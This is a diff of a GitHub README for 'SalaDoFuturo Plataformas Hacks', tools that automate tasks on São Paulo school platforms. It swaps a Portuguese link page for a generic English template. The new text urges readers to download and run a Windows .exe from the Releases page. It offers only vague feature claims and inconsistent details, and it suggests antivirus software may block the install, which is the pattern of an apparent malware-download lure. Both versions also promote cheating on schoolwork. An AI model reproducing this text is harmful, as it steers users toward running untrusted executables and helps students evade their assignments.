@@ -1,45 +1,65 @@
-<a href="#"><img width="100%" src="https://capsule-render.vercel.app/api?type=waving&height=150&color=7851A9&text=Sala%20Do%20Futuro%20Plataformas%20Hacks&fontSize=40&fontAlignY=33&fontColor=FFFFFF"/></a>
+# 😈 SalaDoFuturo-Plataformas-Hacks - Simplify Your Sala do Futuro Tasks
 
---- 
+[![Downloads](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/releases)
 
-<p align="center"><strong>Sala do Futuro Plataformas Hacks</strong></p>
+## 📖 Overview
+SalaDoFuturo Hacks offers scripts, hacks, and websites designed to make tasks in Sala do Futuro easier. This collection aims to enhance your experience and efficiency while using various platforms associated with Sala do Futuro.
 
-<p align="center">CMSP Hacks — O lugar onde você encontra scripts, hacks e websites para facilitar e automatizar as tarefas e plataformas do Sala do Futuro e do CMSP<br>( TarefaSP, RedaçãoSP, Expansão Noturno, Khan Academy, Matific, SPeak, LeiaSP, Alura, PreparaSP, Prova Paulista e Apostilas )</p>
+## 🚀 Getting Started
+This guide will help you download, install, and start using SalaDoFuturo Hacks. Follow the steps below to get everything set up.
 
-<br><br>
+## 📥 Download & Install
+To download the latest version of SalaDoFuturo Hacks, visit this page: [Download the Latest Release](https://github.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/releases).
 
-<p align="center"><strong>Para começar a usar os Scripts, Hacks e Websites, basta clicar no botão da plataforma desejada!</strong></p>
+Once you are on the Releases page, you will find the most recent version of the software. Look for files marked with the tag "Latest Release." Click on the appropriate file to download it to your computer.
 
----
+### System Requirements
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 100 MB available space
 
-<p align="center">
-    <a href="https://darkmodde.xyz/CMSP-Hacks"><img width="10%" alt="TarefasSP" title="TarefasSP" src="https://i.imgur.com/XICsgcH.png"/></a>
-  &nbsp;
-    <a href="https://darkmodde.xyz/CMSP-Hacks"><img width="10%" alt="Redação Paulista" title="Redação Paulista" src="https://i.imgur.com/l3lXH90.png"/></a>
-  &nbsp;
-    <a href="https://darkmodde.xyz/CMSP-Hacks"><img width="10%" alt="Expansão Noturno" title="Expansão Noturno" src="https://i.imgur.com/gjvdhbo.png"/></a>
-    &nbsp;
-    <a href="https://darkmodde.xyz/CMSP-Hacks"><img width="10%" alt="Khan Academy" title="Khan Academy" src="https://i.imgur.com/C9wQOe7.png"/></a>
-  &nbsp;
-    <a href="https://darkmodde.xyz/CMSP-Hacks"><img width="10%" alt="Matific" title="Matific" src="https://i.imgur.com/L2kjjO9.png"/></a>
-  &nbsp;
-    <a href="https://darkmodde.xyz/CMSP-Hacks"><img width="10%" alt="SPeak" title="SPeak" src="https://i.imgur.com/pix66D5.png"/></a>
-  &nbsp;
-    <a href="https://darkmodde.xyz/CMSP-Hacks"><img width="10%" alt="Alura" title="Alura" src="https://i.imgur.com/Lyhs87G.png"/></a>
-</p>
+### Installation Steps
+1. **Locate the Downloaded File:** After the download is complete, navigate to your computer's Downloads folder.
+2. **Run the Installer:**
+   - If the file ends with `.exe`, double-click on it to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
+3. **Open the Application:** After installation, you can find SalaDoFuturo Hacks in your Applications folder or on your Desktop.
 
-<br>
+## ⚙️ Features
+- **Scripts for Easy Access:** Utilize pre-written scripts to perform tasks in Sala do Futuro with ease.
+- **Hacks for Efficiency:** Gain shortcuts and hacks to save time on repetitive actions.
+- **User-friendly Interface:** Navigate through the application without technical expertise. 
 
-<p align="center">
-    <a href="https://darkmodde.xyz"><img width="7%" alt="Website" title="Website" src="https://i.imgur.com/ePxQiXY.png"/></a>
-  &nbsp;
-    <a href="https://pixgg.com/DarkMode"><img width="7%" alt="Doações" title="Doações" src="https://i.imgur.com/RJ6BcN9.png"/></a>
-  &nbsp;
-    <a href="https://discord.gg/platformdestroyer"><img width="7%" alt="Discord ( PD )" title="Discord ( PD )" src="https://i.imgur.com/AOX1nxB.png"/></a>
-</p>
+## 🌟 Usage Guide
+1. **Launching the Application:** Open SalaDoFuturo Hacks by clicking on the desktop icon or from the Applications menu.
+2. **Select Your Task:** Choose a script or hack that you need. The interface will guide you through each option.
+3. **Follow Prompts:** Each function will provide clear instructions to help you complete your tasks efficiently.
 
----
+## ❓ Frequently Asked Questions (FAQs)
+### 1. What operating systems do you support?
+Currently, SalaDoFuturo Hacks works on Windows 10 or newer versions.
 
-<p align="center"><a href="#"><img src="https://komarev.com/ghpvc/?username=NewFuturoHacks&style=for-the-badge&label=Views:&color=gray"/></a></p>
+### 2. Can I use this application on Mac or Linux?
+This version is specifically designed for Windows. We recommend using Windows for the best experience.
 
-<a href="#"><img width="100%" src="https://capsule-render.vercel.app/api?type=waving&height=150&color=7851A9&section=footer"/></a>
+### 3. Do I need an internet connection to run the application?
+You can run the application without an internet connection. However, accessing updates and additional resources requires internet access.
+
+### 4. What should I do if I encounter an error?
+If you run into issues, feel free to check the GitHub Issues page for help. You can also reach out to our support community.
+
+## 🛠️ Troubleshooting
+If you experience problems during installation or usage, follow these steps:
+- Ensure you have the necessary system requirements.
+- Re-download the file and try installing again.
+- Check for any antivirus software that may block the installation.
+
+## 👥 Community and Support
+You’re not alone. Join our community forum to connect with other users, share experiences, and ask for assistance. Find the community page linked within the GitHub repository.
+
+## 🔗 Additional Resources
+For more information about SalaDoFuturo Hacks and its functionalities, visit the following:
+- [GitHub Repository](https://github.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks)
+- [User Community Forum](#) 
+
+Remember, download the latest version from the Releases page: [Download the Latest Release](https://github.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/releases) and start making your tasks easier today!
